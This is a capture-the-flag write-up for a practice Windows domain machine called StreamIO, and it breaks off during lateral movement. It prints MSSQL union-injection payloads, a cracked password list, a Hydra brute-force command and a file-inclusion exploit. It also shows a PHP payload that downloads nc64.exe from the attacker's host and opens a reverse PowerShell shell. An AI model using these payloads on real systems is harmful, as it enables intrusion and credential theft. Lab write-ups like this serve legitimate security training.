#### port scanning
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-16 15:16:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-06-16T15:18:14+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
#### web enumlate
identify the subdomain using ffuf, get watch.xxx
under this domain, we find a search page.
`https://watch.streamio.htb/search.php`
To indentify the sqli point, tried SQLmap first, itseems found something interesting, but pretty slow. try manual injection, use Burp S:
`q=dsadsad' union select 1,@@version,3,4,5,6; --`
```
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
	Sep 24 2019 13:48:23 
	Copyright (C) 2019 Microsoft Corporation
	Express Edition (64-bit) on Windows Server 2019 Standard 10.0 
```
`q=dsadsad' union select 1,DB_NAME(),3,4,5,6; --`
```
it is MS sql server. 
STREAMIO
```
`q=dsadsad' union select 1,table_name,3,4,5,6 from information_schema.tables where table_catalog='STREAMIO'; --`
```
movies
users
```
`q=dsadsad' union select 1,name,3,4,5,6 from syscolumns where id =(select id from sysobjects where name = 'Users'); --`
```
id
is_staff
password
username
```
`q=dsadsad' union select 1,username,3,4,5,6 from users; --`
```
a
admin
alex...Snip...
```
`q=dsadsad' union select 1,password,3,4,5,6 from users; --`
only crack the admin account first, but it failed to login the admin page. So save all the credentials.
```
usernames:

admin
Alexendra
Austin
Barbra 
Barry 
Baxter 
Bruno 
Carmon 
Clara 
Diablo 
Garfield 
Gloria 
James 
Juliette 
Lauren 
Lenord 
Lucifer 
Michelle 
Oliver 
Robert 
Robin 
Sabrina 
Samantha 
Stan 
Thane 
Theodore 
Victor 
Victoria 
William 
yoshihide
```
```
passwords:

##123a8j8w5123##
$monique$1991$
highschoolmusical
$hadoW
paddpadd
$3xybitch
!5psycho8!
66boysandgirls..
physics69i
%$clara
!!sabrina$
```
use Hydra to brute force the valid credential
`└─$ hydra -L user -P password.txt streamio.htb https-form-post  "/login.php:username=^USER^&password=^PASS^:F=Login failed" -t 32    `
```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-23 14:31:10
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 32 tasks per 1 server, overall 32 tasks, 330 login tries (l:30/p:11), ~11 tries per task
[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&password=^PASS^:F=Login failed
[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-23 14:31:40
```
After login, not found anything useful, so try again dir searching by setting cookie.
`─$ sudo dirsearch -u https://streamio.htb --cookie "PHPSESSID=dbib2lb10vgdt05cir8utltv7c"`
```
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/ed/oscptest/OIstream/reports/https_streamio.htb/_26-06-23_14-39-11.txt

Target: https://streamio.htb/

[14:39:11] Starting: 
[14:39:15] 403 -  312B  - /%2e%2e//google.com
[14:39:15] 301 -  147B  - /js  ->  https://streamio.htb/js/
[14:39:15] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[14:39:26] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[14:39:28] 200 -    8KB - /about.php
[14:39:30] 301 -  150B  - /ADMIN  ->  https://streamio.htb/ADMIN/
[14:39:30] 301 -  150B  - /admin  ->  https://streamio.htb/admin/
[14:39:30] 301 -  150B  - /Admin  ->  https://streamio.htb/Admin/
[14:39:30] 404 -    2KB - /admin%20/
[14:39:31] 404 -    2KB - /admin.
[14:39:31] 200 -    2KB - /admin/
[14:39:31] 200 -    2KB - /Admin/
[14:39:33] 200 -    2KB - /admin/index.php
[14:39:48] 404 -    2KB - /asset..
[14:39:55] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[14:40:03] 200 -    6KB - /contact.php
[14:40:05] 301 -  148B  - /css  ->  https://streamio.htb/css/
[14:40:08] 400 -    3KB - /docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console
[14:40:10] 200 -    1KB - /favicon.ico
[14:40:11] 301 -  150B  - /fonts  ->  https://streamio.htb/fonts/
[14:40:14] 301 -  151B  - /images  ->  https://streamio.htb/images/
[14:40:14] 403 -    1KB - /images/
[14:40:14] 404 -    2KB - /index.php.
[14:40:15] 404 -    2KB - /javax.faces.resource.../
[14:40:15] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties
[14:40:15] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo
[14:40:15] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*
[14:40:15] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
[14:40:15] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned
[14:40:15] 400 -    3KB - /jolokia/exec/java.lang:type=Memory/gc
[14:40:15] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd
[14:40:15] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable
[14:40:15] 400 -    3KB - /jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used
[14:40:15] 400 -    3KB - /jolokia/search/*:j2eeType=J2EEServer,*
[14:40:15] 400 -    3KB - /jolokia/read/java.lang:type=*/HeapMemoryUsage
[14:40:15] 400 -    3KB - /jolokia/write/java.lang:type=Memory/Verbose/true
[14:40:15] 403 -    1KB - /js/
[14:40:17] 200 -    4KB - /login.php
[14:40:17] 404 -    2KB - /login.wdm%2e
[14:40:17] 302 -    0B  - /logout.php  ->  https://streamio.htb/
[14:40:34] 404 -    2KB - /rating_over.
[14:40:35] 200 -    4KB - /register.php
[14:40:45] 404 -    2KB - /static..
```

`└─$ sudo dirsearch -u https://streamio.htb/admin --cookie "PHPSESSID=dbib2lb10vgdt05cir8utltv7c" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -f php  `
```
Target: https://streamio.htb/

[15:09:07] Starting: admin/
[15:09:32] 403 -    1KB - /admin/images/
[15:09:32] 301 -  157B  - /admin/images  ->  https://streamio.htb/admin/images/
[15:09:57] 301 -  157B  - /admin/Images  ->  https://streamio.htb/admin/Images/
[15:09:57] 403 -    1KB - /admin/Images/
[15:10:20] 403 -    1KB - /admin/css/
[15:10:20] 301 -  154B  - /admin/css  ->  https://streamio.htb/admin/css/
[15:10:37] 301 -  153B  - /admin/js  ->  https://streamio.htb/admin/js/
[15:10:37] 403 -    1KB - /admin/js/
[15:12:00] 200 -   58B  - /admin/master.php
[15:12:07] 301 -  156B  - /admin/fonts  ->  https://streamio.htb/admin/fonts/
[15:12:07] 403 -    1KB - /admin/fonts/
[15:12:56] 301 -  157B  - /admin/IMAGES  ->  https://streamio.htb/admin/IMAGES/
[15:12:56] 403 -    1KB - /admin/IMAGES/
```
here with many guesses, like fuzz file extention of php..

for master page  https://streamio.htb/admin/master.php, get a hint of includes might be a parameter when access some places.
```
Movie managment
Only accessable through includes
```

for /admin page, fuzz the parameter,
`└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -u 'https://streamio.htb/admin/?FUZZ=' -t 100  -fs 1678 -H "Cookie: PHPSESSID=dbib2lb10vgdt05cir8utltv7c"`
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamio.htb/admin/?FUZZ=
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
 :: Header           : Cookie: PHPSESSID=dbib2lb10vgdt05cir8utltv7c
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1678
________________________________________________

user                    [Status: 200, Size: 2073, Words: 146, Lines: 63, Duration: 3422ms]
staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 3013ms]
movie                   [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 1740ms]
debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 490ms]
```
since a debug parameter, lets try fine inclusion:
`https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php`
```
			this option is for developers onlyPGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==		
```
decode the base64 string,
```
<Snip>...
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```
here eval without any sanitization. So it is a File inclusion point again. We can include any file on the server and execute it.

back to the previous FI point,
`https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php`
```
PD9waHAKZGVmaW5lKCdpbmNsdWRlZCcsdHJ1ZSk7CnNlc3Npb25fc3RhcnQoKTsKaWYoIWlzc2V0KCRfU0VTU0lPTlsnYWRtaW4nXSkpCnsKCWhlYWRlcignSFRUUC8xLjEgNDAzIEZvcmJpZGRlbicpOwoJZGllKCI8aDE+Rk9SQklEREVOPC9oMT4iKTsKfQokY29ubmVjdGlvbiA9IGFycmF5KCJEYXRhYmFzZSI9PiJTVFJFQU1JTyIsICJVSUQiID0+ICJkYl9hZG1pbiIsICJQV0QiID0+ICdCMUBoeDMxMjM0NTY3ODkwJyk7CiRoYW5kbGUgPSBzcWxzcnZfY29ubmVjdCgnKGxvY2FsKScsJGNvbm5lY3Rpb24pOwoKPz4KPCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KCTx0aXRsZT5BZG1pbiBwYW5lbDwvdGl0bGU+Cgk8bGluayByZWwgPSAiaWNvbiIgaHJlZj0iL2ltYWdlcy9pY29uLnBuZyIgdHlwZSA9ICJpbWFnZS94LWljb24iPgoJPCEtLSBCYXNpYyAtLT4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgoJPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIiAvPgoJPCEtLSBNb2JpbGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iIC8+Cgk8IS0tIFNpdGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iIiAvPgoJPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IiIgLz4KCTxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iIiAvPgoKPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANS4xLjMvZGlzdC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIgaW50ZWdyaXR5PSJzaGEzODQtMUJtRTRrV0JxNzhpWWhGbGR2S3VoZlRBVTZhdVU4dFQ5NFdySGZ0akRickNFWFNVMW9Cb3F5bDJRdlo2aklXMyIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+CjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjEuMy9kaXN0L2pzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1rYTdTazBHbG40Z210ejJNbFFuaWtUMXdYZ1lzT2crT01odVArSWxSSDlzRU5CTzBMUm41cSs4bmJUb3Y0KzFwIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KCgk8IS0tIEN1c3RvbSBzdHlsZXMgZm9yIHRoaXMgdGVtcGxhdGUgLS0+Cgk8bGluayBocmVmPSIvY3NzL3N0eWxlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoJPCEtLSByZXNwb25zaXZlIHN0eWxlIC0tPgoJPGxpbmsgaHJlZj0iL2Nzcy9yZXNwb25zaXZlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoKPC9oZWFkPgo8Ym9keT4KCTxjZW50ZXIgY2xhc3M9ImNvbnRhaW5lciI+CgkJPGJyPgoJCTxoMT5BZG1pbiBwYW5lbDwvaDE+CgkJPGJyPjxocj48YnI+CgkJPHVsIGNsYXNzPSJuYXYgbmF2LXBpbGxzIG5hdi1maWxsIj4KCQkJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij91c2VyPSI+VXNlciBtYW5hZ2VtZW50PC9hPgoJCQk8L2xpPgoJCQk8bGkgY2xhc3M9Im5hdi1pdGVtIj4KCQkJCTxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iP3N0YWZmPSI+U3RhZmYgbWFuYWdlbWVudDwvYT4KCQkJPC9saT4KCQkJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij9tb3ZpZT0iPk1vdmllIG1hbmFnZW1lbnQ8L2E+CgkJCTwvbGk+CgkJCTxsaSBjbGFzcz0ibmF2LWl0ZW0iPgoJCQkJPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSI/bWVzc2FnZT0iPkxlYXZlIGEgbWVzc2FnZSBmb3IgYWRtaW48L2E+CgkJCTwvbGk+CgkJPC91bD4KCQk8YnI+PGhyPjxicj4KCQk8ZGl2IGlkPSJpbmMiPgoJCQk8P3BocAoJCQkJaWYoaXNzZXQoJF9HRVRbJ2RlYnVnJ10pKQoJCQkJewoJCQkJCWVjaG8gJ3RoaXMgb3B0aW9uIGlzIGZvciBkZXZlbG9wZXJzIG9ubHknOwoJCQkJCWlmKCRfR0VUWydkZWJ1ZyddID09PSAiaW5kZXgucGhwIikgewoJCQkJCQlkaWUoJyAtLS0tIEVSUk9SIC0tLS0nKTsKCQkJCQl9IGVsc2UgewoJCQkJCQlpbmNsdWRlICRfR0VUWydkZWJ1ZyddOwoJCQkJCX0KCQkJCX0KCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3VzZXInXSkpCgkJCQkJcmVxdWlyZSAndXNlcl9pbmMucGhwJzsKCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3N0YWZmJ10pKQoJCQkJCXJlcXVpcmUgJ3N0YWZmX2luYy5waHAnOwoJCQkJZWxzZSBpZihpc3NldCgkX0dFVFsnbW92aWUnXSkpCgkJCQkJcmVxdWlyZSAnbW92aWVfaW5jLnBocCc7CgkJCQllbHNlIAoJCQk/PgoJCTwvZGl2PgoJPC9jZW50ZXI+CjwvYm9keT4KPC9odG1sPg==
```
after decode:
```
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
	header('HTTP/1.1 403 Forbidden');
	die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

?>
<snip...>
```
here we got a DB crendential

#### foot hold
we create a php payload file to test the "eval(file_get_contents($_POST['include']));" vunl.
```
└─$ cat test.php    
<?php

system('ping myIP');

?>
```
use Burp S to post this request
```
POST /admin/?debug=master.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=dbib2lb10vgdt05cir8utltv7c
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

include=http://10.10.16.25:/test.php

```
set a http file server and a tcpdump interface to catch the traffic
`└─$ python3 -m http.server 80`
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.4.76 - - [23/Jun/2026 15:57:55] "GET /test.php HTTP/1.0" 200 -
```
`─$ sudo tcpdump -i tun0 `
```
[sudo] password for ed: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:04:18.097181 IP 10.10.16.25.59714 > dc01.streamIO.htb.https: Flags [S], seq 3444448761, win 64240, options [mss 1460,sackOK,TS val 3192532175 ecr 0,nop,wscale 9], length 0
16:04:18.178084 IP dc01.streamIO.htb.https > 10.10.16.25.59714: Flags [S.], seq 2989115163, ack 3444448762, win 65535, options [mss 1346,nop,wscale 8,nop,nop,sackOK], length 0
16:04:18.178109 IP 10.10.16.25.59714 > dc01.streamIO.htb.https: Flags [.], ack 1, win 126, length 0
16:04:18.180403 IP 10.10.16.25.59714 > dc01.streamIO.htb.https: Flags [P.], seq 1:503, ack 1, win 126, length 502
16:04:18.259171 IP dc01.streamIO.htb.https > 10.10.16.25.59714: Flags [P.], seq 1:151, ack 503, win 1023, length 150
16:04:18.259190 IP 10.10.16.25.59714 > dc01.streamIO.htb.https: Flags [.], ack 151, win 126, length 0
16:04:18.259982 IP 10.10.16.25.59714 > dc01.streamIO.htb.https: Flags [P.], seq 503:509, ack 151, win 126, length 6
```
after some attempts, if we want to make the reverse shell work, we should get rid of php wrapper.
we do not need <?php ?> tags in the test.php file. since we are pass code to eval().
set teh payload as below, download nc to programdata, adn ran a revershell
```
system('powershell -c wget 10.10.16.25:80/nc64.exe -outfile \\programdata\\nc64.exe');
//system('certutil.exe -urlcache -f http://10.10.16.25:80/nc64.exe nc64.exe');
system('\\programdata\\nc64.exe -e powershell 10.10.16.25 8823');
```
`└─$ python3 -m http.server 80`
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.4.76 - - [23/Jun/2026 16:37:08] "GET /rev.php HTTP/1.0" 200 -
10.129.4.76 - - [23/Jun/2026 16:37:09] "GET /nc64.exe HTTP/1.1" 200 -
```
`└─$ nc -nvlp 8823`
```
listening on [any] 8823 ...
connect to [10.10.16.25] from (UNKNOWN) [10.129.4.76] 65445
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\streamio.htb\admin> whoami
whoami
streamio\yoshihide
```

#### lateral move
As we have the credential of MSSQL DB, use where to locate the tool sqlcmd.
`PS C:\inetpub\streamio.htb\admin> where.exe sqlcmd`
```
where.exe sqlcmd
C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE
```
`sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d STREAMIO -Q "select table_name from STREAMIO.information_schema.tables;"`
```
